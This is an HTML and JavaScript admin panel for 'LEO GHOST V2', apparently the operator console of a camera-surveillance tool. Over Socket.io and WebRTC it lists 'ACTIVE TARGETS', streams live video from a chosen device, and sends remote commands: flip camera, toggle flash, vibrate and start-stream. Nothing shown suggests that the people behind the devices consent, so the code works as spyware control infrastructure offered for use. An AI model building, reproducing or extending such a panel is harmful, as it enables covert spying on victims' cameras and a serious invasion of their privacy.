<!DOCTYPE html>
<html lang="en">
<head>
    <title>LEO GHOST V2 - ADMIN PANEL</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { box-sizing: border-box; transition: 0.3s; }
        body { background: #050a14; color: #00d4ff; font-family: 'Segoe UI', sans-serif; margin: 0; overflow: hidden; }
        
        /* Login Screen */
        #login-screen { position: fixed; inset: 0; background: #050a14; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
        .login-box { background: #0a192f; padding: 30px; border: 2px solid #00d4ff; border-radius: 15px; box-shadow: 0 0 20px #00d4ff55; text-align: center; }
        input { background: #112240; border: 1px solid #00d4ff; color: white; padding: 12px; border-radius: 5px; width: 250px; outline: none; margin-bottom: 15px; }
        button { background: #00d4ff; color: #050a14; border: none; padding: 12px 25px; border-radius: 5px; font-weight: bold; cursor: pointer; }
        button:hover { background: #0088cc; transform: scale(1.05); }
      /* Dashboard */
        #dashboard { display: grid; grid-template-columns: 280px 1fr; height: 100vh; visibility: hidden; }
        
        /* Sidebar */
        .sidebar { background: #0a192f; border-right: 1px solid #00d4ff33; padding: 20px; overflow-y: auto; }
        .sidebar h2 { font-size: 1.2rem; border-bottom: 1px solid #00d4ff55; padding-bottom: 10px; }
        .user-item { background: #112240; padding: 15px; margin-bottom: 10px; border-radius: 8px; cursor: pointer; border: 1px solid transparent; }
        .user-item:hover { border-color: #00d4ff; background: #1d335c; }
        .user-item.active { background: #00d4ff; color: #050a14; font-weight: bold; }

        /* Main View */
        .main-view { padding: 20px; display: flex; flex-direction: column; align-items: center; }
        .video-container { width: 100%; max-width: 800px; aspect-ratio: 16/9; background: #000; border: 3px solid #00d4ff; border-radius: 15px; overflow: hidden; position: relative; }
        video { width: 100%; height: 100%; object-fit: cover; }
        
        /* Controls */
        .controls { margin-top: 20px; display: flex; gap: 15px; flex-wrap: wrap; justify-content: center; }
        .btn-cmd { background: #112240; border: 1px solid #00d4ff; color: #00d4ff; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
        .btn-cmd:hover { background: #00d4ff; color: #050a14; }
      .status-bar { width: 100%; padding: 10px; text-align: left; font-size: 0.9rem; color: #8892b0; }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div id="login-screen">
        <div class="login-box">
            <h2>LEO GHOST V2 ACCESS</h2>
            <input type="password" id="pass" placeholder="Enter Access Pin">
            <br>
            <button onclick="login()">AUTHORIZE</button>
        </div>
    </div>

    <div id="dashboard">
        <div class="sidebar">
            <h2>ACTIVE TARGETS</h2>
            <div id="user-list">
                <p style="color: #444;">No targets online...</p>
            </div>
            </div>

        <div class="main-view">
            <div class="status-bar">System: <span id="sys-status">Waiting for login...</span> | Target: <span id="current-target">None</span></div>
            
            <div class="video-container">
                <video id="remoteVideo" autoplay playsinline></video>
                <div id="video-placeholder" style="position:absolute; inset:0; display:flex; align-items:center; justify-content:center; background:#000;">
                    Connect to a target to see stream
                </div>
            </div>

            <div class="controls">
                <button class="btn-cmd" onclick="sendCommand('flip')">Flip Camera</button>
                <button class="btn-cmd" onclick="sendCommand('flash')">Toggle Flash</button>
                <button class="btn-cmd" onclick="sendCommand('vibrate')">Vibrate</button>
                <button class="btn-cmd" onclick="window.location.reload()">Refresh Panel</button>
            </div>
        </div>
    </div>
    <script>
        const socket = io();
        let currentTargetId = null;
        let peerConnection;
        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

        function login() {
            const pin = document.getElementById('pass').value;
            socket.emit('admin-join', pin);
        }

        socket.on('admin-status', (res) => {
            if(res.success) {
                document.getElementById('login-screen').classList.add('hidden');
                document.getElementById('dashboard').style.visibility = 'visible';
                document.getElementById('sys-status').innerText = "Authorized & Secure";
            } else {
                alert("Incorrect Pin! Access Denied.");
            }
        });
      socket.on('update-targets', (list) => {
            const listDiv = document.getElementById('user-list');
            listDiv.innerHTML = "";
            list.forEach((id, index) => {
                const div = document.createElement('div');
                div.className = `user-item ${currentTargetId === id ? 'active' : ''}`;
                div.innerText = `Target_${index + 1} (ID: ${id.substring(0,5)})`;
                div.onclick = () => selectTarget(id);
                listDiv.appendChild(div);
            });
        });

        async function selectTarget(id) {
            currentTargetId = id;
            document.getElementById('current-target').innerText = id;
            document.getElementById('video-placeholder').innerText = "Connecting to " + id + "...";
            
            // WebRTC Handshake
            peerConnection = new RTCPeerConnection(config);
          peerConnection.onicecandidate = (event) => {
                if(event.candidate) socket.emit('signal', { to: currentTargetId, signal: { candidate: event.candidate } });
            };

            peerConnection.ontrack = (event) => {
                document.getElementById('remoteVideo').srcObject = event.streams[0];
                document.getElementById('video-placeholder').classList.add('hidden');
            };

            // Request stream from target
            socket.emit('command', { targetId: currentTargetId, cmd: 'start-stream' });
        }

        socket.on('signal', async (data) => {
            if(data.signal.sdp) {
                await peerConnection.setRemoteDescription(new RTCSessionDescription(data.signal.sdp));
                if(data.signal.sdp.type === 'offer') {
                    const answer = await peerConnection.createAnswer();
                    await peerConnection.setLocalDescription(answer);
                    socket.emit('signal', { to: data.from, signal: { sdp: answer } });
                  }
            } else if(data.signal.candidate) {
                await peerConnection.addIceCandidate(new RTCIceCandidate(data.signal.candidate));
            }
        });

        function sendCommand(cmd) {
            if(!currentTargetId) return alert("Pehle target select kar bhai!");
            socket.emit('command', { targetId: currentTargetId, cmd: cmd });
        }
    </script>
</body>
</html>
